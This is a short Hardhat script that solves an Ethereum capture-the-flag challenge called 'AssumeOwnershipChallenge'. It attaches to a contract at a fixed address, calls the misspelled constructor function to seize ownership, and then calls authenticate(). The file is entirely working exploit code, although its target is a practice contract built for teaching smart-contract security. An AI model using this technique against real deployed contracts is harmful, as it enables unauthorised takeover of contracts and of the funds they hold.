import { ethers } from 'hardhat';

const address = '0x580B7C0aAD9a14Bf235c49f035FbE06Ef66A9B4E';

async function main() {
  const targetFactory = await ethers.getContractFactory('AssumeOwnershipChallenge');
  const target = await targetFactory.attach(address);
  await target.deployed();

  console.log('deployed on', target.address);

  let tx;

  console.log('calling to the mispelled constructor');
  tx = await target.AssumeOwmershipChallenge();
  await tx.wait();

  console.log('authenticating');
  tx = await target.authenticate();
  await tx.wait();
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
